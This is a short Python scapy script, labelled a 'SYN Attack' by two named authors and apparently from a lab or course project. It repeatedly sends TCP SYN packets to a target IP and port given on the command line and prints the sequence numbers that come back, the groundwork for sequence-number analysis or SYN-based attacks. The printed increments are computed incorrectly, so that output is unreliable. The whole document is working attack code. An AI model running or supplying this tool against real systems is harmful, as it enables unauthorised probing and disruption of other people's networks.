"""
Authors : Fridez Lucas, Maxime Welcklen
Attack : SYN Attack
"""

from scapy.all import *
from scapy.layers.inet import *
import argparse

# [print(f"{p.summary()} with ttl {p.ttl}") for p in IP(ttl=(1,5))/ICMP()]


def __configure_argparse__():
    """Configure argparser

    Returns:
       parser: Arguments parser
    """
    parser = argparse.ArgumentParser(
        description='SYN attack arguments')

    # Optionnal params
    optionnalNamed = parser.add_argument_group('Optionnal named arguments')
    optionnalNamed.add_argument(
        '-d', '--dst', default="192.168.1.103", help='Destination address')
    optionnalNamed.add_argument(
        '-p', '--dport', type=int, default=9999, help='Destination port')

    return parser


def main(destination_ip, dport):
    """Main method that handle attack logic

    Args:
       destination_ip (str): Destination IP
    """
    ans, unans = srloop(IP(dst=destination_ip)/TCP(dport=dport, flags="S"))
    temp = 0
    for s, r in ans:
        temp = r[TCP].seq - temp
        print("%d\t+%d" % (r[TCP].seq, temp))


# Entry point
if __name__ == "__main__":
    parser = __configure_argparse__()
    args = parser.parse_args()
    main(args.dst, args.dport)
